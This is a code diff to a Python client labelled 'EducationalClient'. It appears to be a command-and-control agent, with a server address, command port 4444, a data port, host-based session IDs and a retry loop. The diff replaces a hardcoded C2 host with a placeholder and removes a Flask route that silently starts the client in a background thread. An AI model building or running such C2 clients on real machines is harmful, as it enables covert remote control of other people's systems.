@@ -11,13 +11,11 @@ import requests
 import netifaces
 from pyroute2 import IPRoute
 import psutil
-from flask import Flask, render_template, request
-import threading
 
 class EducationalClient:
     def __init__(self):
         self.config = {
-            "server_ip": os.getenv('SERVER_IP', 'https://c2serve.onrender.com'),
+            "server_ip": os.getenv('SERVER_IP', 'your-render-server-url.onrender.com'),
             "command_port": int(os.getenv('COMMAND_PORT', '4444')),
             "data_port": int(os.getenv('DATA_PORT', '8000')),
             "session_id": f"EDU-{platform.node()}-{int(time.time())}",
@@ -237,21 +235,6 @@ class EducationalClient:
             except Exception as e:
                 print(f"Connection error: {e} - Retrying in 5 seconds...")
                 time.sleep(5)
-
-# Create Flask app
-client_app = Flask(__name__)
-
-@client_app.route('/')
-def home():
-    return render_template('client.html')
-
-@client_app.route('/activate', methods=['POST'])
-def activate():
-    if request.form.get('activation_key') == 'LAB123':  # Simple auth
-        client = EducationalClient()
-        threading.Thread(target=client.start, daemon=True).start()
-        return "Client activated and running in background"
-    return "Invalid activation key", 401
 
 if __name__ == "__main__":
     if os.environ.get('RENDER'):
